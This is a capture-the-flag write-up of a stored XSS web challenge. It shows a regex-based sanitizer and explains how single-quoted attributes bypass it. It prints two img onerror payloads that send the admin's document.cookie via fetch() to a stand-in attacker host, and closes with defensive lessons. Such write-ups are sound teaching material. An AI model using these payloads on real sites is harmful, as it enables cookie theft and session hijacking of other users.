---
title: "Web Challenge XSS"
date: "2025-03-15"
ctf: "ExampleCTF 2025"
category: "web"
difficulty: "Medium"
points: 150
tags: ["web", "xss", "javascript"]
author: "Tham Le"
solved: true
---

# Web Challenge XSS Writeup

## Challenge Description

The website allows users to submit comments that are displayed to administrators. Your goal is to steal the admin's cookie.

## Analysis

The website filters many common XSS payloads but has a vulnerability in how it handles image tags.

![](/assets/images/writeups/ExampleCTF2025/web/web-challenge/xss-website.png)

## Exploitation

By analyzing the source code, I found that the site uses a custom sanitization function:

```javascript
function sanitize(input) {
  // Remove script tags
  input = input.replace(/<script.*?>.*?<\/script>/gi, '');
  // Allow some tags but remove event handlers
  input = input.replace(/on\w+=".*?"/gi, '');
  return input;
}
```

However, this function doesn't handle all cases. I created the following payload:

```html
<img src="x" onerror="fetch('https://attacker.com/'+document.cookie)">
```

The sanitizer only matches double quotes for attributes but not single quotes, so I modified it to:

```html
<img src="x" onerror='fetch("https://attacker.com/"+document.cookie)'>
```

## Solution

After submitting the payload, I received the admin's cookie at my server:

![](/assets/images/writeups/ExampleCTF2025/web/web-challenge/cookie-capture.png)

Using this cookie, I was able to authenticate as the admin and retrieve the flag: `flag{xss_byp4ss_m4st3r}`

## Lessons Learned

1. Always validate and sanitize user input thoroughly
2. Use proper context-aware sanitization libraries
3. Consider implementing a Content Security Policy
4. Avoid storing sensitive information in cookies when possible
